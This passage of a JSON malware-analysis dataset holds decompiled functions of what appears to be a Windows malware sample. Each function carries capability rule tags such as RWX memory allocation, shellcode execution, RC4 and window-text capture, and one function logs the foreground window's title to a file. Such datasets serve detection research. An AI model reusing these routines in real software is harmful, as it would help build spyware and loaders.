| uVar24 & uVar12) + uVar6 + uVar7;\n    uVar3 = uVar2 ^ uVar19 ^ uVar18 ^ uVar3;\n    uVar7 = uVar3 << 1 | uVar3 < 0;\n    uVar16 = (uVar12 * 0x20 | uVar12 >> 0x1b) + 0x8f1bbcdc +\n             ((uVar27 | uVar11) & uVar24 | uVar27 & uVar11) + uVar7 + uVar8;\n    uVar17 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar4 = uVar9 ^ uVar23 ^ uVar21 ^ uVar4;\n    uVar8 = uVar4 << 1 | uVar4 < 0;\n    uVar18 = uVar6 ^ uVar26 ^ uVar22 ^ uVar18;\n    uVar10 = uVar18 << 1 | uVar18 < 0;\n    uVar11 = (uVar12 & uVar17 | (uVar12 | uVar17) & uVar27) + uVar8 + uVar24 + 0x8f1bbcdc +\n             (uVar16 * 0x20 | uVar16 >> 0x1b);\n    uVar3 = uVar12 >> 2 | uVar12 * 0x40000000;\n    uVar12 = (uVar11 * 0x20 | uVar11 >> 0x1b) + 0x8f1bbcdc +\n             ((uVar3 | uVar16) & uVar17 | uVar3 & uVar16) + uVar10 + uVar27;\n    uVar4 = uVar16 >> 2 | uVar16 * 0x40000000;\n    uVar21 = uVar7 ^ uVar25 ^ uVar14 ^ uVar21;\n    uVar21 = uVar21 << 1 | uVar21 < 0;\n    uVar16 = (uVar12 * 0x20 | uVar12 >> 0x1b) + 0x8f1bbcdc +\n             ((uVar4 | uVar11) & uVar3 | uVar4 & uVar11) + uVar21 + uVar17;\n    uVar22 = uVar8 ^ uVar5 ^ uVar15 ^ uVar22;\n    uVar24 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar17 = uVar22 << 1 | uVar22 < 0;\n    uVar22 = uVar12 >> 2 | uVar12 * 0x40000000;\n    uVar12 = (uVar16 * 0x20 | uVar16 >> 0x1b) + 0x8f1bbcdc +\n             ((uVar24 | uVar12) & uVar4 | uVar24 & uVar12) + uVar17 + uVar3;\n    uVar14 = uVar10 ^ uVar2 ^ uVar13 ^ uVar14;\n    uVar3 = uVar14 << 1 | uVar14 < 0;\n    uVar11 = (uVar12 * 0x20 | uVar12 >> 0x1b) + 0x8f1bbcdc +\n             ((uVar22 | uVar16) & uVar24 | uVar22 & uVar16) + uVar3 + uVar4;\n    uVar15 = uVar21 ^ uVar9 ^ uVar19 ^ uVar15;\n    uVar4 = uVar15 << 1 | uVar15 < 0;\n    uVar27 = uVar16 >> 2 | uVar16 * 0x40000000;\n    uVar13 = uVar6 ^ uVar23 ^ uVar13 ^ uVar17;\n    uVar18 = uVar13 << 1 | uVar13 < 0;\n    uVar13 = (uVar12 & uVar27 | (uVar12 | uVar27) & uVar22) + uVar4 + uVar24 + 0x8f1bbcdc +\n             (uVar11 * 0x20 | uVar11 >> 0x1b);\n    uVar16 = uVar12 >> 2 | uVar12 * 0x40000000;\n    uVar14 = uVar11 >> 2 | uVar11 * 0x40000000;\n    uVar12 = (uVar13 * 0x20 | uVar13 >> 0x1b) + 0x8f1bbcdc +\n             ((uVar16 | uVar11) & uVar27 | uVar16 & uVar11) + uVar18 + uVar22;\n    uVar11 = uVar7 ^ uVar26 ^ uVar19 ^ uVar3;\n    uVar15 = uVar11 << 1 | uVar11 < 0;\n    uVar19 = uVar13 >> 2 | uVar13 * 0x40000000;\n    uVar13 = (uVar12 * 0x20 | uVar12 >> 0x1b) + 0x8f1bbcdc +\n             ((uVar14 | uVar13) & uVar16 | uVar14 & uVar13) + uVar15 + uVar27;\n    uVar11 = uVar8 ^ uVar25 ^ uVar23 ^ uVar4;\n    uVar22 = uVar11 << 1 | uVar11 < 0;\n    uVar11 = uVar12 >> 2 | uVar12 * 0x40000000;\n    uVar16 = (uVar13 * 0x20 | uVar13 >> 0x1b) + 0x8f1bbcdc +\n             ((uVar19 | uVar12) & uVar14 | uVar19 & uVar12) + uVar22 + uVar16;\n    uVar12 = uVar10 ^ uVar5 ^ uVar26 ^ uVar18;\n    uVar26 = uVar12 << 1 | uVar12 < 0;\n    uVar12 = uVar13 >> 2 | uVar13 * 0x40000000;\n    uVar23 = (uVar16 * 0x20 | uVar16 >> 0x1b) + 0x8f1bbcdc +\n             ((uVar11 | uVar13) & uVar19 | uVar11 & uVar13) + uVar26 + uVar14;\n    uVar13 = uVar21 ^ uVar2 ^ uVar25 ^ uVar15;\n    uVar24 = uVar13 << 1 | uVar13 < 0;\n    uVar14 = uVar16 >> 2 | uVar16 * 0x40000000;\n    uVar25 = (uVar23 * 0x20 | uVar23 >> 0x1b) + 0x8f1bbcdc +\n             ((uVar16 | uVar12) & uVar11 | uVar16 & uVar12) + uVar24 + uVar19;\n    uVar13 = uVar9 ^ uVar5 ^ uVar22 ^ uVar17;\n    uVar13 = uVar13 << 1 | uVar13 < 0;\n    uVar16 = uVar6 ^ uVar2 ^ uVar26 ^ uVar3;\n    uVar19 = uVar16 << 1 | uVar16 < 0;\n    uVar5 = uVar23 >> 2 | uVar23 * 0x40000000;\n    uVar2 = (uVar25 * 0x20 | uVar25 >> 0x1b) + 0x8f1bbcdc +\n            ((uVar14 | uVar23) & uVar12 | uVar14 & uVar23) + uVar13 + uVar11;\n    uVar11 = uVar7 ^ uVar9 ^ uVar24 ^ uVar4;\n    uVar11 = uVar11 << 1 | uVar11 < 0;\n    uVar16 = (uVar2 * 0x20 | uVar2 >> 0x1b) +\n             ((uVar5 | uVar25) & uVar14 | uVar5 & uVar25) + 0x8f1bbcdc + uVar19 + uVar12;\n    uVar23 = uVar25 >> 2 | uVar25 * 0x40000000;\n    uVar25 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar2 = (uVar16 * 0x20 | uVar16 >> 0x1b) + 0xca62c1d6 + (uVar5 ^ uVar23 ^ uVar2) + uVar11 + uVar14;\n    uVar12 = uVar8 ^ uVar6 ^ uVar13 ^ uVar18;\n    uVar12 = uVar12 << 1 | uVar12 < 0;\n    uVar9 = uVar16 >> 2 | uVar16 * 0x40000000;\n    uVar14 = (uVar2 * 0x20 | uVar2 >> 0x1b) + 0xca62c1d6 + (uVar23 ^ uVar25 ^ uVar16) + uVar12 + uVar5;\n    uVar16 = uVar10 ^ uVar7 ^ uVar19 ^ uVar15;\n    uVar16 = uVar16 << 1 | uVar16 < 0;\n    uVar5 = (uVar14 * 0x20 | uVar14 >> 0x1b) + 0xca62c1d6 + (uVar2 ^ uVar25 ^ uVar9) + uVar16 + uVar23;\n    uVar7 = uVar2 >> 2 | uVar2 * 0x40000000;\n    uVar2 = uVar21 ^ uVar8 ^ uVar11 ^ uVar22;\n    uVar23 = uVar2 << 1 | uVar2 < 0;\n    uVar8 = uVar14 >> 2 | uVar14 * 0x40000000;\n    uVar14 = (uVar5 * 0x20 | uVar5 >> 0x1b) + (uVar7 ^ uVar14 ^ uVar9) + 0xca62c1d6 + uVar23 + uVar25;\n    uVar2 = uVar10 ^ uVar12 ^ uVar26 ^ uVar17;\n    uVar2 = uVar2 << 1 | uVar2 < 0;\n    uVar6 = uVar5 >> 2 | uVar5 * 0x40000000;\n    uVar25 = (uVar14 * 0x20 | uVar14 >> 0x1b) + (uVar7 ^ uVar8 ^ uVar5) + uVar2 + uVar9 + 0xca62c1d6;\n    uVar9 = uVar21 ^ uVar16 ^ uVar24 ^ uVar3;\n    uVar9 = uVar9 << 1 | uVar9 < 0;\n    uVar5 = uVar14 >> 2 | uVar14 * 0x40000000;\n    uVar21 = (uVar25 * 0x20 | uVar25 >> 0x1b) + (uVar8 ^ uVar6 ^ uVar14) + uVar9 + uVar7 + 0xca62c1d6;\n    uVar17 = uVar23 ^ uVar13 ^ uVar4 ^ uVar17;\n    uVar17 = uVar17 << 1 | uVar17 < 0;\n    uVar7 = uVar25 >> 2 | uVar25 * 0x40000000;\n    uVar14 = (uVar21 * 0x20 | uVar21 >> 0x1b) + (uVar6 ^ uVar5 ^ uVar25) + uVar17 + uVar8 + 0xca62c1d6;\n    uVar3 = uVar2 ^ uVar19 ^ uVar18 ^ uVar3;\n    uVar3 = uVar3 << 1 | uVar3 < 0;\n    uVar10 = uVar21 >> 2 | uVar21 * 0x40000000;\n    uVar21 = (uVar14 * 0x20 | uVar14 >> 0x1b) + (uVar21 ^ uVar5 ^ uVar7) + 0xca62c1d6 + uVar3 + uVar6;\n    uVar4 = uVar9 ^ uVar11 ^ uVar15 ^ uVar4;\n    uVar4 = uVar4 << 1 | uVar4 < 0;\n    uVar6 = uVar14 >> 2 | uVar14 * 0x40000000;\n    uVar14 = (uVar21 * 0x20 | uVar21 >> 0x1b) + (uVar10 ^ uVar14 ^ uVar7) + uVar4 + uVar5 + 0xca62c1d6;\n    uVar18 = uVar17 ^ uVar12 ^ uVar22 ^ uVar18;\n    uVar18 = uVar18 << 1 | uVar18 < 0;\n    uVar5 = uVar21 >> 2 | uVar21 * 0x40000000;\n    uVar21 = (uVar10 ^ uVar6 ^ uVar21) + uVar18 + uVar7 + 0xca62c1d6 + (uVar14 * 0x20 | uVar14 >> 0x1b);\n    uVar15 = uVar3 ^ uVar16 ^ uVar26 ^ uVar15;\n    uVar25 = uVar15 << 1 | uVar15 < 0;\n    uVar8 = uVar14 >> 2 | uVar14 * 0x40000000;\n    uVar10 = uVar10 + 0xca62c1d6 + (uVar6 ^ uVar5 ^ uVar14) + uVar25 + (uVar21 * 0x20 | uVar21 >> 0x1b);\n    uVar22 = uVar4 ^ uVar23 ^ uVar24 ^ uVar22;\n    uVar22 = uVar22 << 1 | uVar22 < 0;\n    uVar14 = (uVar5 ^ uVar8 ^ uVar21) + uVar22 + uVar6 + 0xca62c1d6 + (uVar10 * 0x20 | uVar10 >> 0x1b);\n    uVar7 = uVar21 >> 2 | uVar21 * 0x40000000;\n    uVar26 = uVar18 ^ uVar2 ^ uVar13 ^ uVar26;\n    uVar26 = uVar26 << 1 | uVar26 < 0;\n    uVar15 = (uVar14 * 0x20 | uVar14 >> 0x1b) + 0xca62c1d6 + (uVar10 ^ uVar8 ^ uVar7) + uVar26 + uVar5;\n    uVar24 = uVar25 ^ uVar9 ^ uVar19 ^ uVar24;\n    uVar21 = uVar10 >> 2 | uVar10 * 0x40000000;\n    uVar5 = uVar24 << 1 | uVar24 < 0;\n    uVar8 = uVar8 + 0xca62c1d6 + (uVar21 ^ uVar14 ^ uVar7) + uVar5 + (uVar15 * 0x20 | uVar15 >> 0x1b);\n    uVar14 = uVar14 >> 2 | uVar14 * 0x40000000;\n    uVar13 = uVar22 ^ uVar17 ^ uVar11 ^ uVar13;\n    uVar6 = uVar13 << 1 | uVar13 < 0;\n    uVar10 = uVar15 >> 2 | uVar15 * 0x40000000;\n    uVar7 = (uVar8 * 0x20 | uVar8 >> 0x1b) + 0xca62c1d6 + (uVar21 ^ uVar14 ^ uVar15) + uVar6 + uVar7;\n    uVar19 = uVar26 ^ uVar3 ^ uVar12 ^ uVar19;\n    uVar13 = uVar19 << 1 | uVar19 < 0;\n    uVar17 = (uVar14 ^ uVar10 ^ uVar8) + uVar13 + uVar21 + (uVar7 * 0x20 | uVar7 >> 0x1b) + 0xca62c1d6;\n    uVar21 = uVar8 >> 2 | uVar8 * 0x40000000;\n    uVar11 = uVar5 ^ uVar4 ^ uVar16 ^ uVar11;\n    uVar11 = uVar11 << 1 | uVar11 < 0;\n    uVar14 = (uVar17 * 0x20 | uVar17 >> 0x1b) + 0xca62c1d6 + (uVar10 ^ uVar21 ^ uVar7) + uVar11 + uVar14;\n    uVar12 = uVar6 ^ uVar18 ^ uVar23 ^ uVar12;\n    uVar4 = uVar7 >> 2 | uVar7 * 0x40000000;\n    uVar3 = uVar17 >> 2 | uVar17 * 0x40000000;\n    uVar17 = (uVar12 << 1 | uVar12 < 0) + (uVar14 * 0x20 | uVar14 >> 0x1b) + -0x359d3e2a +\n             (uVar17 ^ uVar21 ^ uVar4) + uVar10;\n    uVar16 = uVar13 ^ uVar25 ^ uVar2 ^ uVar16;\n    uVar13 = uVar14 >> 2 | uVar14 * 0x40000000;\n    uVar12 = (uVar16 << 1 | uVar16 < 0) + (uVar17 * 0x20 | uVar17 >> 0x1b) +\n             (uVar3 ^ uVar14 ^ uVar4) + 0xca62c1d6 + uVar21;\n    uVar23 = uVar11 ^ uVar22 ^ uVar9 ^ uVar23;\n    var_5ch[3] = var_5ch[3] + uVar13;\n    var_5ch[2] = var_5ch[2] + (uVar17 >> 2 | uVar17 * 0x40000000);\n    var_5ch[1] = var_5ch[1] + uVar12;\n    var_5ch[4] = var_5ch[4] + uVar3;\n    *var_5ch = (uVar3 ^ uVar13 ^ uVar17) + *var_5ch +\n               (uVar12 * 0x20 | uVar12 >> 0x1b) + 0xca62c1d6 + (uVar23 << 1 | uVar23 < 0) + uVar4;\n    return;\n}\n",
        "token_count": 10878
    },
    "004098eb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create thread",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004098eb(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpThreadAttributes;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    lpThreadAttributes = 0;\n    var_8h = fcn.00401000(0x1c);\n    iVar1 = arg_ch + 8;\n    piVar3 = var_8h;\n    for (iVar2 = 7; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    var_8h[3] = *(arg_ch + 4);\n    fcn.004043c7(iVar1);\n    var_8h[1] = arg_8h;\n    *var_8h = var_4h;\n    var_8h[6] = *(arg_ch + 4);\n    iVar2 = fcn.00401000(0x208);\n    fcn.00404656(iVar1);\n    fcn.00404656(iVar1);\n    iVar1 = fcn.004045f0();\n    fcn.0040126d(iVar2, arg_ch, iVar1 * 2 + 2);\n    fcn.00406f1d();\n    fcn.00406f1d();\n    piVar3 = var_8h;\n    var_8h[5] = iVar2;\n    uVar4 = *(arg_ch + 4);\n    fcn.00414047();\n    arg_8h_00 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004095aa, piVar3, 0, &lpThreadAttributes);\n    fcn.00402612(arg_8h_00);\n    (*_sym.imp.KERNEL32.dll_ReleaseMutex)(*(var_4h + 0x10), arg_8h_00, uVar4, piVar3);\n    return;\n}\n",
        "token_count": 508
    },
    "00409b57": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows",
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d",
            "get common file path"
        ],
        "decompiled_code": "\nuint fcn.00409b57(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint var_60h;\n    uint var_14h;\n    uint uStack20;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0;\n    fcn.00413473();\n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0xff, 0x1000, 0x40);\n    (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryA)(iVar1, 0x104);\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar1);\n    puVar4 = 0x419b78;\n    puVar5 = iVar1 + iVar2;\n    for (iVar3 = 5; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    fcn.00401293(&var_60h, 0, 0x44);\n    var_14h = 0;\n    uStack20 = 0;\n    var_ch = 0;\n    uStack12 = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(iVar1, 0, 0, 0, 0, 0x8000000, 0, 0, &var_60h, &var_14h);\n    if (iVar1 == 0) {\n        var_ch = fcn.0041344c();\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        fcn.0041344c();\n    }\n    return var_ch;\n}\n",
        "token_count": 430
    },
    "00409df9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00409df9(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    char *in_ECX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    char *pcVar3;\n    uint unaff_retaddr;\n    uint in_stack_0000000c;\n    uint in_stack_00000010;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x5530e0 = CONCAT44(*0x5530e4, *0x5530e0);\n    if ((*0x5530e0 == 0) && (*0x5530e0 = CONCAT44(*0x5530e4, *0x5530e0),  *0x5530e4 == 0)) {\n        *0x5530e0 = fcn.00409eee();\n        if (*0x5530e0 == 0) {\n            *0x5530e0 = *0x5530e0;\n            *0x5530e4 = *0x5530e0 >> 0x20;\n            return *0x5530e0;\n        }\n    }\n    *0x5530e4 = *0x5530e0 >> 0x20;\n    var_14h = 0;\n    var_ch = in_ECX >> 0x1f;\n    pcVar3 = in_ECX;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = pcVar3 - (in_ECX + 1);\n    var_18h = CONCAT22(iVar2 + 1, iVar2);\n    _var_8h = 0;\n    fcn.0040a6de(*0x5530e0, *0x5530e4, 4, arg_8h, arg_ch, &var_18h, &var_18h >> 0x1f, 0, 0, &var_8h, &var_8h >> 0x1f, \n                 unaff_EDI, unaff_ESI, var_18h, 0, in_ECX, var_ch, 0, 0, unaff_EBP, unaff_retaddr, arg_8h, arg_ch, \n                 in_stack_0000000c, in_stack_00000010);\n    return var_8h;\n}\n",
        "token_count": 684
    },
    "0040a845": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a845(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    iVar4 = 0x419b90 - param_2;\n    do {\n        uVar3 = *(iVar4 + param_2);\n        uVar1 = *param_2;\n        uVar2 = uVar3 + 0x20;\n        if (0x19 < uVar3 - 0x41) {\n            uVar2 = uVar3;\n        }\n        param_2 = param_2 + 1;\n        uVar3 = uVar1 + 0x20;\n        if (0x19 < uVar1 - 0x41) {\n            uVar3 = uVar1;\n        }\n    } while ((uVar2 != 0) && (uVar2 == uVar3));\n    return uVar2 - uVar3;\n}\n",
        "token_count": 235
    },
    "0040a8ab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0040a8ab(uint arg_8h, uint arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ulong uVar1;\n    int64_t iVar2;\n    uint unaff_retaddr;\n    uint in_stack_ffffffe8;\n    uint var_10h;\n    uint var_ch;\n    uint in_stack_fffffff4;\n    uint var_4h;\n    \n    *0x5530f8 = CONCAT44(*0x5530fc, *0x5530f8);\n    if ((*0x5530f8 == 0) && (*0x5530f8 = CONCAT44(*0x5530fc, *0x5530f8),  *0x5530fc == 0)) {\n        uVar1 = fcn.0040a2ab();\n        *0x5530f8 = fcn.00409df9(uVar1, uVar1 >> 0x20);\n        if (*0x5530f8 == 0) goto code_r0x0040a953;\n    }\n    *0x5530fc = *0x5530f8 >> 0x20;\n    if (arg_14h == NULL) {\n        var_10h = 0;\n    }\n    else {\n        var_10h = *arg_14h;\n    }\n    var_ch = 0;\n    iVar2 = fcn.0040a6de(*0x5530f8, *0x5530fc, 5, in_ECX, in_ECX >> 0x1f, arg_8h, arg_ch, in_EDX, in_EDX >> 0x1f, \n                         arg_10h, 0, &var_10h, &var_10h >> 0x1f, unaff_EDI, unaff_ESI, unaff_EBX, in_stack_ffffffe8, \n                         var_10h, 0, in_stack_fffffff4, in_ECX, unaff_EBP, unaff_retaddr, arg_8h, arg_ch);\n    if (iVar2 == 0) {\n        if (arg_14h != NULL) {\n            *arg_14h = var_10h;\n        }\n        *0x5530fc = *0x5530f8 >> 0x20;\n        return 1;\n    }\n    fcn.00409e8d(iVar2);\ncode_r0x0040a953:\n    *0x5530fc = *0x5530f8 >> 0x20;\n    return 0;\n}\n",
        "token_count": 661
    },
    "0040a976": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nulong __cdecl fcn.0040a976(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ulong uVar1;\n    int64_t iVar2;\n    uint in_stack_ffffffe0;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint in_stack_fffffff4;\n    uint var_4h;\n    \n    *0x5530d0 = CONCAT44(*0x5530d4, *0x5530d0);\n    if ((*0x5530d0 == 0) && (*0x5530d0 = CONCAT44(*0x5530d4, *0x5530d0),  *0x5530d4 == 0)) {\n        uVar1 = fcn.0040a2ab();\n        *0x5530d0 = fcn.00409df9(uVar1, uVar1 >> 0x20);\n        if (*0x5530d0 != 0) goto code_r0x0040a9c3;\n    }\n    else {\ncode_r0x0040a9c3:\n        *0x5530d4 = *0x5530d0 >> 0x20;\n        var_10h = arg_8h;\n        var_ch = arg_ch;\n        var_14h = 0;\n        iVar2 = fcn.0040a6de(*0x5530d0, *0x5530d4, 6, in_ECX, in_ECX >> 0x1f, &var_10h, &var_10h >> 0x1f, 0, 0, &var_18h\n                             , &var_18h >> 0x1f, 0x3000, 0, 0x40, 0, unaff_EDI, unaff_ESI, unaff_EBX, in_stack_ffffffe0\n                             , in_EDX, 0, arg_8h, arg_ch, in_stack_fffffff4, in_ECX);\n        if (iVar2 == 0) goto code_r0x0040aa1d;\n        fcn.00409e8d(iVar2);\n    }\n    var_10h = 0;\n    var_ch = 0;\ncode_r0x0040aa1d:\n    *0x5530d4 = *0x5530d0 >> 0x20;\n    return CONCAT44(var_ch, var_10h);\n}\n",
        "token_count": 663
    },
    "0040aa22": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0040aa22(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ulong uVar1;\n    int64_t iVar2;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    _var_8h = 0;\n    var_18h = 0;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    *0x553100 = CONCAT44(*0x553104, *0x553100);\n    if ((*0x553100 == 0) && (*0x553100 = CONCAT44(*0x553104, *0x553100),  *0x553104 == 0)) {\n        uVar1 = fcn.0040a2ab();\n        *0x553100 = fcn.00409df9(uVar1, uVar1 >> 0x20);\n        if (*0x553100 != 0) goto code_r0x0040aa7c;\n    }\n    else {\ncode_r0x0040aa7c:\n        *0x553104 = *0x553100 >> 0x20;\n        iVar2 = fcn.0040a6de(*0x553100, *0x553104, 10, arg_8h, arg_ch, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, arg_10h, arg_14h, 0\n                             , 0, &var_8h, &var_8h >> 0x1f, &var_18h, &var_18h >> 0x1f, unaff_EDI, unaff_ESI);\n        if (iVar2 == 0) {\n            goto code_r0x0040aac9;\n        }\n        fcn.00409e8d(iVar2);\n    }\n    var_8h = 0;\n    var_4h = 0;\ncode_r0x0040aac9:\n    *0x553104 = *0x553100 >> 0x20;\n    return CONCAT44(var_4h, var_8h);\n}\n",
        "token_count": 531
    },
    "0040aacd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0040aacd(uint arg_8h, uint arg_ch, uint noname_2, int32_t arg_14h)\n\n{\n    int32_t in_ECX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ulong uVar1;\n    int64_t iVar2;\n    uint unaff_retaddr;\n    uint in_stack_ffffffe8;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x5530d8 = CONCAT44(*0x5530dc, *0x5530d8);\n    if ((*0x5530d8 == 0) && (*0x5530d8 = CONCAT44(*0x5530dc, *0x5530d8),  *0x5530dc == 0)) {\n        uVar1 = fcn.0040a2ab();\n        *0x5530d8 = fcn.00409df9(uVar1, uVar1 >> 0x20);\n        if (*0x5530d8 == 0) goto code_r0x0040ab69;\n    }\n    *0x5530dc = *0x5530d8 >> 0x20;\n    var_10h = arg_8h;\n    var_4h = 0;\n    var_ch = arg_ch;\n    var_8h = 0x100000;\n    iVar2 = fcn.0040a6de(*0x5530d8, *0x5530dc, 5, in_ECX, in_ECX >> 0x1f, &var_10h, &var_10h >> 0x1f, &var_8h, \n                         &var_8h >> 0x1f, 0x40, 0, arg_14h, arg_14h >> 0x1f, unaff_EDI, unaff_ESI, unaff_EBX, \n                         in_stack_ffffffe8, arg_8h, arg_ch, 0x100000, 0, unaff_EBP, unaff_retaddr, arg_8h, arg_ch);\n    if (iVar2 == 0) {\n        return 1;\n    }\n    fcn.00409e8d(iVar2);\ncode_r0x0040ab69:\n    *0x5530dc = *0x5530d8 >> 0x20;\n    return 0;\n}\n",
        "token_count": 626
    },
    "0040b172": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get graphical window text",
            "write file on Windows"
        ],
        "decompiled_code": "\nvoid fcn.0040b172(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint lpString;\n    uint var_ch;\n    uint var_8h;\n    int32_t lpString2;\n    \n    fcn.00401293(&lpString, 0, 0x208);\n    lpString2 = 0;\n    uVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n    iVar5 = (*_sym.imp.USER32.dll_GetWindowTextW)(uVar4, &lpString, 0x104);\n    if (iVar5 < 1) {\n        fcn.0040428f(0x419d20);\n    }\n    else {\n        fcn.004043fa(0x419d18);\n        uVar4 = fcn.0040460a(&lpString);\n        fcn.004042c5(uVar4);\n        fcn.004043fa(0x419d1c);\n        fcn.00406f1d();\n        var_8h = 0;\n    }\n    pcVar3 = _sym.imp.KERNEL32.dll_lstrlenW;\n    iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenW)(*0x41e6a0 + 0x210);\n    if (iVar5 != 0) {\n        uVar4 = fcn.0040460a(*0x41e6a0 + 0x210);\n        iVar6 = fcn.00404276(uVar4);\n        fcn.00406f1d();\n        iVar5 = *0x41e6a0;\n        var_8h = 0;\n        if (iVar6 != 0) {\n            *(*0x41e6a0 + 0xa10) = 1;\n            goto code_r0x0040b270;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x41e6a0 + 0x210, lpString2);\n    iVar5 = *0x41e6a0;\n    *(*0x41e6a0 + 0xa10) = 0;\ncode_r0x0040b270:\n    uVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(*(iVar5 + 0xc), 4, 1, 0, 4, 0x80, 0);\n    iVar5 = *0x41e6a0;\n    pcVar2 = _sym.imp.KERNEL32.dll_WriteFile;\n    piVar1 = *0x41e6a0 + 0xa10;\n    *(*0x41e6a0 + 4) = uVar4;\n    if (*piVar1 == 0) {\n        uVar4 = (*pcVar3)(0x419d10);\n        (*pcVar2)(*(*0x41e6a0 + 4), 0x419d10, uVar4, iVar5 + 8, 0);\n        iVar5 = *0x41e6a0 + 8;\n        if (lpString2 == 0) {\n            iVar6 = 0;\n        }\n        else {\n            iVar6 = (*pcVar3)(lpString2);\n        }\n        (*pcVar2)(*(*0x41e6a0 + 4), lpString2, iVar6 * 2, iVar5, 0);\n        iVar5 = *0x41e6a0 + 8;\n        uVar4 = 